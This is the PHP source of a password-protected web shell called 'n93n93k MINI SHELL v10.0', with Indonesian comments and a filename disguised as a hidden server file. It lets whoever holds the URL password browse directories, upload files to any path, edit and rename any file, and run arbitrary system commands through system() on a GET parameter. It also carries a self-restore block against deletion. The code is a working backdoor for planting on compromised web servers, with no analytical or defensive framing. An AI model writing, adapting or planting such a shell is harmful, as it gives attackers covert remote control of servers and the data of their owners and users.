<?php
// File: .ht.php
// JANGAN UBAH NAMA! (ukuran: ~1.5KB)

// === ANTI-DELETE + SELF-RESTORE ===
$me = __FILE__;
if (!file_exists($me)) {
    $src = substr(file_get_contents(__FILE__), 6);
    @file_put_contents($me, '<?php ' . $src);
    @chmod($me, 0644);
}

// === PASSWORD ===
$pwd = "n93n93k"; // GANTI SESUAI
if (!isset($_GET['p']) || $_GET['p'] !== $pwd) {
    echo "<pre style='color:#f00;'>cari apa mas?"; exit;
}

// === NAVIGASI FOLDER ===
$dir = realpath($_GET['dir'] ?? getcwd());
if (!$dir || !is_dir($dir)) $dir = getcwd();
chdir($dir);

// === UPLOAD ===
if (isset($_POST['upload']) && isset($_FILES['f'])) {
    $dest = $_POST['dest'] ?: $_FILES['f']['name'];
    if (move_uploaded_file($_FILES['f']['tmp_name'], $dest)) {
        $msg = "[+] Upload OK: $dest";
    } else $msg = "[-] Upload GAGAL";
}

// === EDIT ===
if (isset($_POST['edit']) && isset($_POST['file']) && isset($_POST['content'])) {
    if (file_put_contents($_POST['file'], $_POST['content'])) {
        $msg = "[+] Edit OK: {$_POST['file']}";
    } else $msg = "[-] Edit GAGAL";
}

// === RENAME ===
if (isset($_POST['rename']) && isset($_POST['old']) && isset($_POST['new'])) {
    if (rename($_POST['old'], $_POST['new'])) {
        $msg = "[+] Rename OK: {$_POST['old']} ? {$_POST['new']}";
    } else $msg = "[-] Rename GAGAL";
}

// === HEADER ===
echo "<pre style='font-family:monospace;color:#0f0;background:#000;padding:10px;'>";
echo "n93n93k MINI SHELL v10.0\n";
echo "Dir: <b>" . htmlspecialchars($dir) . "</b>\n\n";

// === TOMBOL NAVIGASI ===
$parent = dirname($dir);
if ($parent !== $dir && is_dir($parent)) {
    echo "<a href='?p=$pwd&dir=" . urlencode($parent) . "' style='color:#0ff;'>[ .. ] Parent</a>\n";
}

$items = scandir($dir);
$dirs = $files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $path = "$dir/$item";
    if (is_dir($path)) {
        $dirs[] = $item;
    } else {
        $files[] = $item;
    }
}

// === FOLDER (KLIK UNTUK MASUK) ===
foreach ($dirs as $d) {
    $path = "$dir/$d";
    echo "<a href='?p=$pwd&dir=" . urlencode($path) . "' style='color:#0f0;'>[DIR] $d/</a>\n";
}

echo "\n";

// === FILE (KLIK UNTUK EDIT) ===
foreach ($files as $f) {
    $path = "$dir/$f";
    $size = filesize($path);
    $perm = substr(sprintf('%o', fileperms($path)), -4);
    echo "<a href='?p=$pwd&dir=" . urlencode($dir) . "&edit=" . urlencode($f) . "' style='color:#ff0;'>$f</a> [$perm] ($size B)\n";
}

echo "\n";

// === UPLOAD FORM ===
echo "<form method='post' enctype='multipart/form-data'>
Upload: <input type='file' name='f'>
To: <input type='text' name='dest' size='15' placeholder='nama_file'>
<input type='submit' name='upload' value='GO'>
</form>\n";

// === EDIT FORM ===
$file_to_edit = $_GET['edit'] ?? '';
$content = '';
if ($file_to_edit && file_exists("$dir/$file_to_edit")) {
    $content = htmlspecialchars(file_get_contents("$dir/$file_to_edit"));
}
echo "<form method='post'>
Edit: <input type='text' name='file' value='$file_to_edit' size='25'>
<input type='submit' value='Load'>
<textarea name='content' rows='10' cols='80' style='background:#111;color:#0f0;'>$content</textarea>
<input type='submit' name='edit' value='Save'>
</form>\n";

// === RENAME FORM ===
echo "<form method='post'>
Rename: <input type='text' name='old' size='20' placeholder='file_lama'>
? <input type='text' name='new' size='20' placeholder='file_baru'>
<input type='submit' name='rename' value='Rename'>
</form>\n";

// === COMMAND ===
if (isset($_GET['c'])) {
    echo "\n[CMD] " . htmlspecialchars($_GET['c']) . "\n<pre style='background:#111;color:#0f0;'>";
    system($_GET['c']);
    echo "</pre>";
}

echo "\n<a href='?p=$pwd&dir=" . urlencode($dir) . "&c=ls -la'>[ls]</a> | ";
echo "<a href='?p=$pwd&dir=" . urlencode($dir) . "&c=pwd'>[pwd]</a> | ";
echo "<a href='?p=$pwd&dir=" . urlencode($dir) . "&c=id'>[id]</a>";

if (isset($msg)) echo "\n\n$msg";
?>